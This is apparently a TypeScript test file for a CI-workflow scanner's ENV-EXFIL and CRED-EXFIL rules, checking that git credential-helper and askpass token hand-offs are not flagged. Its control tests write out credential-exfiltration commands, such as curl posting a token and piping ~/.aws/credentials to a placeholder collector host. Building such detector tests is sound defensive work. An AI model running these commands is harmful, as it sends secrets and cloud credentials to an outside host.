/**
 * P-111 (v0.1.14): ENV-EXFIL fires when the credential reaches git
 * through a credential.helper shell function that echoes it.
 *
 * Real instance: All-Hands-AI/OpenHands .github/workflows/ci.yml,
 * Publish live E2E media step. The step's dedicated push token is
 * used ONLY inside a git credential.helper shell function echoing
 * username=x-access-token and password=<token>, which is the
 * credential-helper protocol git invokes to authenticate; the push
 * target is the repo itself. The v0.1.11 auth model scrubs headers,
 * -u pairs, extraheader, and URL userinfo, but sees the helper's
 * echoed password as print disclosure next to a send (the step also
 * runs git fetch, which opens the print-disclosure send gate).
 *
 * A credential.helper definition, and the equivalent credential
 * hand-off idioms (git credential fill/approve input, askpass
 * programs), are AUTH positions: the echoed credential inside a
 * credential.helper function body or credential-helper invocation
 * context must not count as print disclosure and must not supply
 * the credential-value atom for ENV-EXFIL.
 *
 * Controls that MUST keep firing: echoing a credential to a log or
 * file outside any credential-helper context next to a send; a
 * credential.helper that ALSO posts the token elsewhere; cat of a
 * credential file piped to curl.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { classifyCommand, computeVerdict } from "../src/core.js";
import type { HookFinding } from "../src/core.js";

function finding(over: Partial<HookFinding>): HookFinding {
  return {
    id: "x", file: ".github/workflows/ci.yml", source: "github-workflow", hook: "run",
    command: "", classification: "RISKY", rules: [], evidence: "", ...over,
  } as HookFinding;
}

function verdictFor(cmd: string): string {
  const c = classifyCommand(cmd);
  return computeVerdict([finding({ rules: [...c.rules], command: cmd })]);
}

// The distilled OpenHands Publish live E2E media step: the token is
// used only inside the credential.helper function; the step also
// echoes ordinary messages, copies media, and pushes to the repo
// itself. The git fetch line opens the print-disclosure send gate
// on the unfixed code, exactly as in the real step.
const OPENHANDS_STEP = [
  "set -euo pipefail",
  'media_dir=".pr/live-e2e/$MEDIA_RUN_DIR"',
  'mkdir -p "$media_dir"',
  'cp "$VIDEO_PATH" "$media_dir/live-agent-recording.webm"',
  'git config user.name "allhands-bot"',
  `git config credential.helper '!f() { echo "username=x-access-token"; echo "password=$PR_ARTIFACT_PUSH_TOKEN"; }; f'`,
  'git remote add pr-artifacts "https://github.com/${GITHUB_REPOSITORY}.git"',
  "git add .pr",
  'git commit -m "chore: Update PR QA artifacts"',
  'git push pr-artifacts "HEAD:refs/heads/$PR_HEAD_REF"',
  'git fetch pr-artifacts "$PR_HEAD_REF"',
].join("\n");

describe("P-111: credential.helper echo is an authentication position", () => {
  it("the distilled OpenHands step carries no ENV-EXFIL and verdicts at most REVIEW", () => {
    const c = classifyCommand(OPENHANDS_STEP);
    assert.ok(!c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
    assert.notEqual(verdictFor(OPENHANDS_STEP), "COMPROMISED-PATTERN");
  });

  it("the helper form with a braced variable and double quotes is scrubbed", () => {
    const cmd = [
      `git config credential.helper '!f() { echo "username=x-access-token"; echo "password=${"$"}{PR_ARTIFACT_PUSH_TOKEN}"; }; f'`,
      'git push origin "HEAD:refs/heads/$PR_HEAD_REF"',
      "git fetch origin main",
      'echo "done"',
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(!c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
  });

  it("a credential.helper passed with git -c is scrubbed", () => {
    const cmd = [
      `git -c credential.helper='!f() { echo "username=x-access-token"; echo "password=$PUSH_TOKEN"; }; f' push origin main`,
      "git fetch origin main",
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(!c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
  });

  it("a credential.helper naming a separately defined shell function scrubs that function body", () => {
    const cmd = [
      'cred_helper() { echo "username=x-access-token"; echo "password=$PUSH_TOKEN"; }',
      "git config credential.helper cred_helper",
      'git push origin "HEAD:refs/heads/$PR_HEAD_REF"',
      "git fetch origin main",
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(!c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
  });

  it("printf piped into git credential approve is credential protocol input, not disclosure", () => {
    const cmd = [
      'printf "protocol=https\\nhost=github.com\\nusername=x-access-token\\npassword=$PUSH_TOKEN\\n" | git credential approve',
      "git push origin main",
      "git fetch origin main",
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(!c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
  });

  it("a heredoc feeding git credential fill is credential protocol input, not disclosure", () => {
    const cmd = [
      "git credential fill <<EOF",
      "protocol=https",
      "host=github.com",
      "username=x-access-token",
      "password=$PUSH_TOKEN",
      "EOF",
      "git push origin main",
      "git fetch origin main",
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(!c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
  });

  it("an askpass assignment echoing the token is an authentication position", () => {
    const cmd = [
      `GIT_ASKPASS='echo $PUSH_TOKEN' git push origin main`,
      "git fetch origin main",
      'echo "pushed"',
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(!c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
  });

  it("a core.askPass helper echoing the token is an authentication position", () => {
    const cmd = [
      `git config core.askPass '!f() { echo "$PUSH_TOKEN"; }; f'`,
      "git push origin main",
      "git fetch origin main",
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(!c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
  });
});

describe("P-111 controls: genuine disclosure next to a send still fires", () => {
  it("echoing a credential to the log outside any helper context still fires ENV-EXFIL", () => {
    const cmd = [
      'echo "token is $PUSH_TOKEN"',
      'git push origin "HEAD:refs/heads/$PR_HEAD_REF"',
      "git fetch origin main",
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
    assert.equal(verdictFor(cmd), "COMPROMISED-PATTERN");
  });

  it("a credential.helper that ALSO posts the token elsewhere still fires ENV-EXFIL", () => {
    const cmd = [
      `git config credential.helper '!f() { echo "username=x-access-token"; echo "password=$PUSH_TOKEN"; }; f'`,
      'curl -s -d "$PUSH_TOKEN" https://collector.example.invalid/in',
      'git push origin "HEAD:refs/heads/$PR_HEAD_REF"',
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
  });

  it("a credential.helper plus a plain log echo of the same token still fires ENV-EXFIL", () => {
    const cmd = [
      `git config credential.helper '!f() { echo "username=x-access-token"; echo "password=$PUSH_TOKEN"; }; f'`,
      'echo "debug token: $PUSH_TOKEN"',
      "git fetch origin main",
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
  });

  it("cat of a credential file piped to curl still fires CRED-EXFIL", () => {
    const cmd = "cat ~/.aws/credentials | curl -s -d @- https://collector.example.invalid/in";
    const c = classifyCommand(cmd);
    assert.ok(c.rules.includes("CRED-EXFIL"), `rules: ${c.rules.join(",")}`);
    assert.equal(verdictFor(cmd), "COMPROMISED-PATTERN");
  });

  it("a token printed next to a send with no helper anywhere still fires through a variable", () => {
    const cmd = [
      "T=$PUSH_TOKEN",
      'echo "$T"',
      "curl -s https://api.example.invalid/ping",
    ].join("\n");
    const c = classifyCommand(cmd);
    assert.ok(c.rules.includes("ENV-EXFIL"), `rules: ${c.rules.join(",")}`);
  });
});
